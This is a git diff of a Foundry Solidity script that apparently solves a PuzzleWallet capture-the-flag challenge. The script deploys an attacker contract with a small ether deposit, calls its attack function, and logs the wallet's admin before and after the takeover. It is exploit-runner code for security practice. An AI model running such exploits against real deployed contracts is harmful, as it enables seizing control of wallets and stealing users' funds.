@@ -1,10 +1,10 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-import {Script} from "forge-std/Script.sol";
+import {Script, console2} from "forge-std/Script.sol";
 import {Puzzled} from "../src/24_PuzzleWallet.sol";
 
-interface IPuzzleWallet {
+interface IPuzzled {
     function addToWhitelist(address addr) external;
 
     function deposit() external payable;
@@ -20,16 +20,24 @@ interface IPuzzleWallet {
     function setMaxBalance(uint256 _maxBalance) external;
 }
 
+interface IPuzzleWallet {
+    function admin() external view returns (address);
+}
+
 contract PoC is Script {
-    IPuzzleWallet wallet =
-        IPuzzleWallet(0xB8759fFB6d451D0a9C9404d1cB0D1B8D75e4F5b0); // Replace with your PuzzleWallet instance
+    address private immutable puzzleWallet =
+        0xB8759fFB6d451D0a9C9404d1cB0D1B8D75e4F5b0; // Replace with your PuzzleWallet instance
 
     function run() external {
         uint256 deployer = vm.envUint("PRIVATE_KEY");
         vm.startBroadcast(deployer);
 
-        Puzzled puzzled = new Puzzled(address(wallet));
+        console2.log("Current admin: ", IPuzzleWallet(puzzleWallet).admin());
+
+        Puzzled puzzled = new Puzzled{value: 0.001 ether}(puzzleWallet);
         puzzled.attack();
+
+        console2.log("New admin: ", IPuzzleWallet(puzzleWallet).admin());
 
         vm.stopBroadcast();
     }
